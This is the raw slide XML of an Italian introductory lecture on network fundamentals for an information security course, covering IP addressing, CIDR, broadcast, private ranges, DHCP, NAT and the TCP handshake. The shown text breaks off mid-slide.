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6858000" cx="9144000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Exo 2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0BABFE-C9E5-4584-B912-0D625FA61023}">
  <a:tblStyle styleId="{6F0BABFE-C9E5-4584-B912-0D625FA610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Exo2-bold.fntdata"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Exo2-regular.fntdata"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide14.xml"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Exo2-boldItalic.fntdata"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Exo2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08a3595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08a359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908a35955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908a359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908a35955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908a359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08a35955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08a359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908a35955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908a359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3e0d01fc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3e0d01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08a35955_0_2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08a3595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908a35955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908a3595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92c999fba_0_6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92c999fb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92c999fba_0_7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92c999fb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92c999fba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92c999fb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92c999fba_0_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92c999fb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965685a52_0_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965685a52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65685a52_0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965685a5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92c999fba_0_1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92c999fb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991e3bb3f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991e3bb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93e0d01fc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93e0d01f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3e0d01fc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93e0d01f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3e0d01fc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93e0d01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93e0d01fc_0_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93e0d01f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93e0d01fc_0_1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a93e0d01f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93e0d01fc_0_1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93e0d01fc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93e0d01fc_0_1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93e0d01f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93e0d01fc_0_16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93e0d01fc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965685a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965685a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965685a52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a965685a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965685a52_0_1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965685a5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a965685a52_0_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a965685a5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965685a52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965685a5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a965685a52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a965685a5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965685a52_0_5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965685a5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965685a52_0_5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965685a5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965685a52_0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965685a5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965685a52_0_1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965685a5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965685a52_0_19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a965685a52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965685a52_0_1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a965685a5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965685a52_0_18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a965685a52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a965685a52_0_2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a965685a5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965685a52_0_2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965685a5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9bb9c1b01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9bb9c1b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9bb9c1b01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9bb9c1b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9bb9c1b01_0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9bb9c1b0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9bb9c1b01_0_8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a9bb9c1b0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9bb9c1b01_0_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9bb9c1b0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a9bb9c1b01_0_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a9bb9c1b0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9bb9c1b01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9bb9c1b0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a9bb9c1b01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a9bb9c1b01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9bb9c1b01_0_1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9bb9c1b0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9bb9c1b01_0_1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a9bb9c1b0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a9bb9c1b01_0_1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a9bb9c1b0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a18d7d32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aa18d7d3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bc82d841e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bc82d84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abc82d841e_0_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abc82d841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Exo 2"/>
              <a:buNone/>
              <a:defRPr sz="5200"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Exo 2"/>
              <a:buNone/>
              <a:defRPr b="1" sz="3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xo 2"/>
              <a:buNone/>
              <a:defRPr b="1" sz="30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06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●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○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Exo 2"/>
              <a:buChar char="■"/>
              <a:defRPr sz="28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google.co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gif"/><Relationship Id="rId4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translate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8</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Sicurezza delle Reti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Sicurezza dell’Informazione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Indirizzi IP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36624"/>
            <a:ext cx="8520600" cy="50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dispositivo è identificato all’interno di una rete di </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>dispositivo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>tramite un indirizzo IP. Un indirizzo IP è formato da 4 numeri divisi da punti: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it"/>
              <a:t>10.20.30.40</a:t>
            </a:r>
            <a:endParaRPr i="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Ogni numero può assumere un valore che varia da 0 a 255, quindi rappresentabile da un singolo byte.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Reti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536625"/>
            <a:ext cx="8520600" cy="49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Anche le reti vengono identificate tramite un indirizzo IP. Questa volta, la rete ha solamente una parte dell’indirizzo IP fissato. La parte rimanente </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>identifica</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> un dispositivo.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Per esempio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: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230</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>.0.0.0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>/8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>-&gt; i primi 8 bit (1 byte) identificano la rete</a:t>
            </a:r>
            <a:endParaRPr b="1"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19.10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>.0.0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>/16</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> -&gt; i primi 16 bit (2 byte) identificano la rete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11.12.13</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>.0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>/24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> -&gt; i primi 24 bit (3 byte) identificano la rete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11.12.13</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>.128</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>/26</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> -&gt; i primi 26 bit (3 byte e 2 bit) identificano la rete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Reti e dispositivi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536625"/>
            <a:ext cx="8520600" cy="49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La rete </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4.128.</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>.0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t> in bit è: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.00000000</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/24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400"/>
              <a:t>I dispositivi nella rete possono avere come IP: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00000100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>-&gt;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4</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:srgbClr val="CC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00001000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>-&gt;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8</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:srgbClr val="CC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00001100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>-&gt;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12</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="24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Reti e dispositivi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536625"/>
            <a:ext cx="8520600" cy="49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/>
              <a:t>La rete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.128</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/26</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t> in bit è: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b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>000000</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/26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400"/>
              <a:t>I dispositivi nella rete possono avere come IP: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b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.1</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>000100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>-&gt;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132</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:srgbClr val="CC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b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.1</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>001000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>-&gt;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136</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:srgbClr val="CC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b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.1</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>001100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>-&gt;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</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>140</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="240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Indirizzo reti e broadcast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400"/>
              <a:t>La rete </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4.128.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>.0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t> in bit è: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.00000000</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/24</a:t>
            </a:r>
            <a:endParaRPr b="1"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400"/>
              <a:t>L’indirizzo della rete è dunque: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</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="3C78D8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>00000000</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/24</a:t>
            </a:r>
            <a:endParaRPr b="1"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400"/>
              <a:t>L’indirizzo di broadcast (messaggio a tutti i dispositivi nella rete) è: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2400">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>00000100.10000000.00000001</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="3C78D8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>11111111</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>/24</a:t>
            </a:r>
            <a:endParaRPr b="1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Localhost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400"/>
              <a:t>Ogni </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>dispositivo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t> può identificare se stesso tramite l’indirizzo IP </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>, anche chiamato </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>. Può aprire connessioni verso proprie porte.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2400"/>
              <a:t>Esempio: se un computer espone un sito web alla porta </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>8080</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="2400"/>
              <a:t>, il computer stesso può connettersi al proprio servizio tramite l’URL: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it" sz="2400"/>
              <a:t>http://127.0.0.1:8080</a:t>
            </a:r>
            <a:endParaRPr b="1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Reti private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Classe </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>A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10.0.0.0 – 10.255.255.255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Prefisso: 10.0.0.0/8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Classe </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>B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172.16.0.0 – 172.31.255.255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Prefisso: 172.16.0.0/12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Classe </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>C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192.168.0.0 – 192.168.255.255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Prefisso: 192.168.0.0/16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Rappresentazione di una rete</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="103" name="Google Shape;103;p21"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="104" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3537871" y="3568524"/>
            <a:ext cx="445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21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4654290" y="2751100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21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5713765" y="3568525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21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6583890" y="2751100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21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7993465" y="3568525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computer monitor with joypixels written on the top of it (Fornito da Tenor)"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90" y="1923699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monitor with joypixels written on the top of it (Fornito da Tenor)"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190" y="1923699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monitor with joypixels written on the top of it (Fornito da Tenor)"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065" y="4395924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monitor with joypixels written on the top of it (Fornito da Tenor)"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765" y="4395924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ireless router by linksys with a antenna attached to it (Fornito da Tenor)" id="104" name="Google Shape;10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472" y="3154824"/>
            <a:ext cx="827400" cy="82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21"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="114" idx="0"/>
            <a:endCxn id="104" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2311380" y="3568525"/>
            <a:ext cx="39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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="29056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3149900" y="1505175"/>
            <a:ext cx="5682300" cy="478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3149900" y="5980825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192.168.0.0/16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3149900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1295825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7.132.1.5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Dynamic Host Configuration Protocol (DHCP)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536624"/>
            <a:ext cx="8520600" cy="50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È un protocollo di rete che </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>assegna</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>automaticamente indirizzi IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> e impostazioni di rete ai dispositivi, così possono comunicare senza configurazione manuale.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Consiste in 4 passi. Conosciuto come sequenza </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>DORA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3663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Discover </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>– Il dispositivo trasmette: “C’è un server DHCP?”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Offer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>– Il server risponde: “Ecco un IP che puoi usare.”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Request </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>– Il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>dispositivo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>conferma: “Vorrei usare quell’IP.”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Acknowledge </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>– Il server approva: “Va bene, è tuo.”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Quando il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>dispositivo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>si connette alla rete, non sa l’indirizzo della rete. Tuttavia, può mandare un messaggio a tutti (broadcast) con l’IP </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>255.255.255.255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Molto spesso, i router che fanno NAT hanno anche un server DNS per salvare coppie domini (es. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>google.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>) IP (8.8.8.8).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Rappresentazione di una rete</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="130" name="Google Shape;130;p23"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="131" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3537871" y="3568524"/>
            <a:ext cx="445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23"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4654290" y="2751100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3"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5713765" y="3568525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3"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6583890" y="2751100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3"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7993465" y="3568525"/>
            <a:ext cx="0" cy="82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computer monitor with joypixels written on the top of it (Fornito da Tenor)"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90" y="1923699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monitor with joypixels written on the top of it (Fornito da Tenor)"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0190" y="1923699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monitor with joypixels written on the top of it (Fornito da Tenor)"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065" y="4395924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uter monitor with joypixels written on the top of it (Fornito da Tenor)"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765" y="4395924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ireless router by linksys with a antenna attached to it (Fornito da Tenor)"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472" y="3154824"/>
            <a:ext cx="827400" cy="82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3"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="141" idx="0"/>
            <a:endCxn id="131" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2311380" y="3568525"/>
            <a:ext cx="399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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="29056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3149900" y="1505175"/>
            <a:ext cx="5682300" cy="478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3149900" y="5980825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192.168.0.0/16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4836575" y="53059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192.168.1.3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149900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777100" y="16147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5706700" y="16147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192.168.1.4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7116275" y="53059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192.168.1.5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1295825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7.132.1.5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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3149900" y="1505175"/>
            <a:ext cx="5682300" cy="478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Network Address Translation (NAT)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="156" name="Google Shape;156;p24"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="157" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3537871" y="3568524"/>
            <a:ext cx="1127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8" name="Google Shape;158;p24"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4654290" y="2751100"/>
            <a:ext cx="0" cy="82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computer monitor with joypixels written on the top of it (Fornito da Tenor)" id="159" name="Google Shape;15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90" y="1923699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ireless router by linksys with a antenna attached to it (Fornito da Tenor)"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472" y="3154824"/>
            <a:ext cx="827400" cy="82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4"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="161" idx="0"/>
            <a:endCxn id="157" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2311380" y="3568525"/>
            <a:ext cx="39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1" name="Google Shape;161;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="29056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3149900" y="5980825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192.168.0.0/16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149900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3777100" y="16147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1295825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7.132.1.5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6903125" y="2961925"/>
            <a:ext cx="1682400" cy="303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192.168.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>1.2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6903125" y="3265225"/>
            <a:ext cx="1682400" cy="3033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8.8.23.4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6903125" y="3568525"/>
            <a:ext cx="1682400" cy="3033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27392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6903125" y="3871825"/>
            <a:ext cx="1682400" cy="3033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443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5220725" y="2961925"/>
            <a:ext cx="168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SRC IP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5220725" y="3265225"/>
            <a:ext cx="168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DST IP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5220725" y="3568525"/>
            <a:ext cx="168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SRC PORT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220725" y="3871825"/>
            <a:ext cx="16824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0" lang="it" sz="1400" u="none" cap="none" strike="noStrike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DST PORT</a:t>
            </a:r>
            <a:endParaRPr i="0" sz="14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3149900" y="1505175"/>
            <a:ext cx="5682300" cy="4784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79" name="Google Shape;179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Network Address Translation (NAT)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="180" name="Google Shape;180;p25"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="181" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3537871" y="3568524"/>
            <a:ext cx="1127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5"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4654290" y="2751100"/>
            <a:ext cx="0" cy="827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a computer monitor with joypixels written on the top of it (Fornito da Tenor)" id="183" name="Google Shape;1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590" y="1923699"/>
            <a:ext cx="827400" cy="82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ireless router by linksys with a antenna attached to it (Fornito da Tenor)" id="181" name="Google Shape;18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0472" y="3154824"/>
            <a:ext cx="827400" cy="827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25"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="185" idx="0"/>
            <a:endCxn id="181" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2311380" y="3568525"/>
            <a:ext cx="3990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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="29056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3149900" y="5980825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192.168.0.0/16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3149900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3777100" y="16147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192.168.1.2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1295825" y="3874000"/>
            <a:ext cx="17544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  <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>7.132.1.5</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk2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5710875" y="1714375"/>
            <a:ext cx="29115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" sz="1800">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Qualsiasi messaggio </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="1800">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>proveniente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" sz="1800">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t> da internet e destinato a una rete privata viene bloccato. Internet non può sapere a quale rete privata sia destinato un messaggio.</a:t>
            </a:r>
            <a:endParaRPr i="0" sz="1800" u="none" cap="none" strike="noStrike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2650625" y="3195300"/>
            <a:ext cx="947100" cy="9471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Comunicazione tramite protocollo TCP</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="197" name="Google Shape;197;p26"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3318250" y="1887425"/>
            <a:ext cx="0" cy="45366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5659775" y="1887425"/>
            <a:ext cx="0" cy="45366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6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3341813" y="2117725"/>
            <a:ext cx="2294400" cy="71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6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3339725" y="2906925"/>
            <a:ext cx="2307300" cy="586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6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3341813" y="3592275"/>
            <a:ext cx="2294400" cy="71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26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="535275" y="1810088"/>
            <a:ext cx="27594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" u="sng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SYN packet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src = A</a:t>
            </a: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 - Porta src = C</a:t>
            </a:r>
            <a:endParaRPr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dst = B </a:t>
            </a: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- Porta dst = D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5622375" y="2906925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SYN-ACK packet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src = B - Porta src = D</a:t>
            </a:r>
            <a:endParaRPr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dst = A - Porta dst = C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537375" y="3321102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ACK packet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src = A - Porta src = C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dst = B - Porta dst = D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535275" y="4166104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Messaggio 1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src = A - Porta src = C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dst = B - Porta dst = D</a:t>
            </a:r>
            <a:endParaRPr u="sng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06" name="Google Shape;206;p26"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3341813" y="4501929"/>
            <a:ext cx="2294400" cy="71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6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3326679" y="5271329"/>
            <a:ext cx="2307300" cy="586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6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
